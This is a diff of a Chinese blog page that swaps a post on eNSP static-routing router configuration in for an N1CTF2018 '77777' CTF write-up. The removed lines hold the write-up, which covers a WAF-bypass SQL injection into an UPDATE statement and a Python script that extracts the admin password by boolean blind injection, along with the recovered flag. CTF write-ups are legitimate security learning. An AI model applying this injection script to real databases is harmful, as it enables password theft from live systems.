@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="ctf," />
+  <meta name="keywords" content="网络基础," />
 
 
 
@@ -79,23 +79,23 @@
 
 
 
-<meta name="description" content="N1CTF2018 77777 writeup序之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧 题目：77777题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段">
-<meta name="keywords" content="ctf">
+<meta name="description" content="eNSP静态路由配置序这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础 课堂给出的拓扑如下 要求四个路由器之前相互可以通信，自己动手实践了一下,将自己的配置过程记录下来，也算课堂的时间没有白费 在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下R1 sy sy">
+<meta name="keywords" content="网络基础">
 <meta property="og:type" content="article">
-<meta property="og:title" content="N1CTF2018 77777 writeup">
-<meta property="og:url" content="http://yoursite.com/2018/03/12/N1CTF2018/index.html">
+<meta property="og:title" content="eNSP静态路由配置">
+<meta property="og:url" content="http://yoursite.com/2018/03/18/routestatic/index.html">
 <meta property="og:site_name" content="Lawliet Blog">
-<meta property="og:description" content="N1CTF2018 77777 writeup序之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧 题目：77777题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段">
+<meta property="og:description" content="eNSP静态路由配置序这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础 课堂给出的拓扑如下 要求四个路由器之前相互可以通信，自己动手实践了一下,将自己的配置过程记录下来，也算课堂的时间没有白费 在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下R1 sy sy">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180312/a2EE46LmeH.png?imageslim">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180312/Hj66G37HjJ.png?imageslim">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180312/823DJ2bh5f.png?imageslim">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180312/FGB5bcl7F0.png?imageslim">
-<meta property="og:updated_time" content="2018-03-12T02:58:46.941Z">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180318/fBGD2l9b88.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180319/GH301D7akb.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180319/B5mBkk2hmA.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180319/1jj7hDj12C.png?imageslim">
+<meta property="og:updated_time" content="2018-03-19T05:39:27.432Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="N1CTF2018 77777 writeup">
-<meta name="twitter:description" content="N1CTF2018 77777 writeup序之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧 题目：77777题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段">
-<meta name="twitter:image" content="http://p008biu9n.bkt.clouddn.com/blog/180312/a2EE46LmeH.png?imageslim">
+<meta name="twitter:title" content="eNSP静态路由配置">
+<meta name="twitter:description" content="eNSP静态路由配置序这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础 课堂给出的拓扑如下 要求四个路由器之前相互可以通信，自己动手实践了一下,将自己的配置过程记录下来，也算课堂的时间没有白费 在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下R1 sy sy">
+<meta name="twitter:image" content="http://p008biu9n.bkt.clouddn.com/blog/180318/fBGD2l9b88.png?imageslim">
 
 
 
@@ -125,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/03/12/N1CTF2018/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/03/18/routestatic/"/>
 
 
 
 
 
-  <title>N1CTF2018 77777 writeup | Lawliet Blog</title>
+  <title>eNSP静态路由配置 | Lawliet Blog</title>
   
 
 
@@ -258,7 +258,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/12/N1CTF2018/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/18/routestatic/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lawliet">
@@ -275,7 +275,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">N1CTF2018 77777 writeup</h1>
+          <h1 class="post-title" itemprop="name headline">eNSP静态路由配置</h1>
         
 
         <div class="post-meta">
@@ -287,8 +287,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-12T10:53:49+08:00">
-                2018-03-12
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-18T23:32:19+08:00">
+                2018-03-18
               </time>
             
 
@@ -310,8 +310,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf</span>
+                  <a href="/categories/网络基础/" itemprop="url" rel="index">
+                    <span itemprop="name">网络基础</span>
                   </a>
                 </span>
 
@@ -347,49 +347,74 @@
       
 
       
-        <h1 id="N1CTF2018-77777-writeup"><a href="#N1CTF2018-77777-writeup" class="headerlink" title="N1CTF2018 77777 writeup"></a>N1CTF2018 77777 writeup</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧</strong></p>
-<h3 id="题目：77777"><a href="#题目：77777" class="headerlink" title="题目：77777"></a>题目：77777</h3><p><strong>题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段代码中，代码如下</strong></p>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/a2EE46LmeH.png?imageslim" alt="mark"></p>
-<p><strong>代码接收post参数中的flag和hi，拼接后更新数据库的points值，并在<code>http://47.97.168.223/#profile</code>页面中显示points值，简单来说，post参数可控，我们可以提交参数构造数据库中女朋友的points，并且在页面显示points值</strong></p>
-<pre><code>update users set points=&apos;post过来的flag和hi拼接后的结果&apos;
-</code></pre><p><strong>当然hi是经过waf函数处理的，看来是绕waf的注入，简单了测试了一下，过滤了updatexml,extractvalue,database()等函数，报错回显这个思路暂时放弃了，因为information_schema也被过滤了，做起来会很麻烦</strong></p>
-<p><strong>题目的第二个提示</strong></p>
-<pre><code>the flag is `admin&apos;s password`:)
-</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/Hj66G37HjJ.png?imageslim" alt="mark"><br><strong>猜测数据库里有password字段,由此想到第二个思路，提交:</strong></p>
-<pre><code>flag=任意数字&amp;hi=任意数字 and (构造逻辑判断)
-</code></pre><p><strong>数据库语句变为:</strong></p>
-<pre><code>update users set points=任意数字 and （构造逻辑判断）
-</code></pre><p><strong>如果逻辑判断为真，将points值更新为1，为假则更新为0,构造逻辑判断的时候发现=也被过滤，用like替代即可,思路有了开始写脚本</strong></p>
-<pre><code>import requests
-import string
-list=string.maketrans(&quot;&quot;,&quot;&quot;)[33:127]#所有可显示字符，后面猜测password内容使用
-url=&quot;http://47.97.168.223/#profile&quot;#显示分数页面
-#read password
-#i=0
-#while 1:
-#    payload={&apos;flag&apos;:1,&apos;hi&apos;:&apos;1 and length(password) like %d&apos;%(i)}
-#    html=requests.post(url=url,data=payload).content
-#    if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明长度正确，输出并break
-#        print i
-#        break
-#    else:
-#        i=i+1
-#password length is 13
-#read password
-i=0
-for i in range(1,14):
-    for j in list:
-        payload={&apos;flag&apos;:1,&apos;hi&apos;:&quot;1 and substr(password,%d,1) like &apos;%s&apos;&quot;%(i,j)}
-        html=requests.post(url=url,data=payload).content
-        if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明内容正确，输出并break
-            print j
-            break
-#flag is HE3L3LOCAT233
-</code></pre><p><strong>脚本通过<code>1 and length(password) like %d</code>来判断password长度为13，为真时页面points显示为1，否则为0</strong></p>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/823DJ2bh5f.png?imageslim" alt="mark"></p>
-<p><strong>然后<code>1 and substr(password,%d,1) like &#39;%s&#39;</code>循环判断password内容，为真时页面的points值显示为1，否则为0</strong></p>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/FGB5bcl7F0.png?imageslim" alt="mark"></p>
-<p><strong>flag为N1CTF{HE3L3LOCAT233}</strong></p>
+        <h1 id="eNSP静态路由配置"><a href="#eNSP静态路由配置" class="headerlink" title="eNSP静态路由配置"></a>eNSP静态路由配置</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础</strong></p>
+<h3 id="课堂给出的拓扑如下"><a href="#课堂给出的拓扑如下" class="headerlink" title="课堂给出的拓扑如下"></a>课堂给出的拓扑如下</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180318/fBGD2l9b88.png?imageslim" alt="mark"></p>
+<p><strong>要求四个路由器之前相互可以通信，自己动手实践了一下,将自己的配置过程记录下来，也算课堂的时间没有白费</strong></p>
+<h3 id="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"><a href="#在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下" class="headerlink" title="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"></a>在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下</h3><pre><code>R1
+sy
+sysname r1
+int e0/0/0
+ip add 10.10.10.1 24
+q
+int g0/0/0
+ip add 2.2.2.2 30
+q
+int g0/0/1
+ip add 3.3.3.2 30
+q
+
+R2
+sy
+sysname r2
+int e0/0/0
+ip add 192.168.2.1 24
+q
+int g0/0/0
+ip add 2.2.2.1 30
+1
+int g0/0/1
+ip add 1.1.1.1 30
+q
+
+R3
+sy
+sysname r3
+int e0/0/0
+ip add 172.16.2.1 24
+q
+int g0/0/0
+ip add 4.4.4.1 30
+q
+int g0/0/1
+ip add 3.3.3.1 24
+q
+
+R4
+sy
+sysname r4
+int g0/0/1
+ip add 1.1.1.2 30
+q
+int g0/0/0
+ip add 4.4.4.2 30
+q
+</code></pre><h3 id="配置静态路由"><a href="#配置静态路由" class="headerlink" title="配置静态路由"></a>配置静态路由</h3><p><strong>配置之前要先明白什么是下一跳地址，以拓扑举例，比如PC1要经过路由R1与PC2通讯，那么在路由R1的路由表中，下一跳地址应该为路由R2:2.2.2.1,所以在R1的路由表中添加一条静态路由</strong></p>
+<pre><code>ip route-static 192.168.2.1 255.255.255.0 2.2.2.1
+</code></pre><p><strong>同时要在R2的路由表中添加一条PC2到PC1的静态路由</strong></p>
+<pre><code>ip route-static 10.10.10.1 255.255.255.0 2.2.2.2
+</code></pre><p><strong>了解了上面的基础，剩下的就是在每个路由器里面一一配置，各路由器配置如下</strong> </p>
+<p><strong>PC1到PC2之间的通信配置</strong></p>
+<pre><code>R1：ip route-static 192.168.2.1 255.255.255.0 2.2.2.1
+R2：ip route-static 10.10.10.1 255.255.255.0 2.2.2.2
+</code></pre><p><strong>测试PC1和PC2互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/GH301D7akb.png?imageslim" alt="mark"><br><strong>PC1到PC3之间的通信配置</strong></p>
+<pre><code>R1：ip route-static 172.16.2.1 255.255.255.0 3.3.3.1
+R3：ip route-static 10.10.10.1 255.255.255.0 3.3.3.2
+</code></pre><p><strong>测试PC1和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/B5mBkk2hmA.png?imageslim" alt="mark"><br><strong>PC2到PC3之间的通信配置</strong></p>
+<pre><code>R2：ip route-static 172.16.2.1 255.255.255.0 1.1.1.2
+R4：ip route-static 172.16.2.1 255.255.255.0 4.4.4.1
+R3：ip route-static 192.168.2.1 255.255.255.0 4.4.4.2
+R4：ip route-static 192.168.2.1 255.255.255.0 1.1.1.1
+</code></pre><p><strong>测试PC2和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/1jj7hDj12C.png?imageslim" alt="mark"></p>
 
       
     </div>
@@ -407,7 +432,7 @@ for i in range(1,14):
       
         <div class="post-tags">
           
-            <a href="/tags/ctf/" rel="tag"># ctf</a>
+            <a href="/tags/网络基础/" rel="tag"># 网络基础</a>
           
         </div>
       
@@ -420,8 +445,8 @@ for i in range(1,14):
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/02/27/centos7mysql/" rel="next" title="centos7安装mysql">
-                <i class="fa fa-chevron-left"></i> centos7安装mysql
+              <a href="/2018/03/12/N1CTF2018/" rel="next" title="N1CTF2018 77777 writeup">
+                <i class="fa fa-chevron-left"></i> N1CTF2018 77777 writeup
               </a>
             
           </div>
@@ -429,10 +454,6 @@ for i in range(1,14):
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/03/18/routestatic/" rel="prev" title="eNSP静态路由配置">
-                eNSP静态路由配置 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -570,7 +591,7 @@ for i in range(1,14):
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#N1CTF2018-77777-writeup"><span class="nav-number">1.</span> <span class="nav-text">N1CTF2018 77777 writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#序"><span class="nav-number">1.0.1.</span> <span class="nav-text">序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目：77777"><span class="nav-number">1.0.2.</span> <span class="nav-text">题目：77777</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#eNSP静态路由配置"><span class="nav-number">1.</span> <span class="nav-text">eNSP静态路由配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#序"><span class="nav-number">1.0.1.</span> <span class="nav-text">序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#课堂给出的拓扑如下"><span class="nav-number">1.0.2.</span> <span class="nav-text">课堂给出的拓扑如下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"><span class="nav-number">1.0.3.</span> <span class="nav-text">在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置静态路由"><span class="nav-number">1.0.4.</span> <span class="nav-text">配置静态路由</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
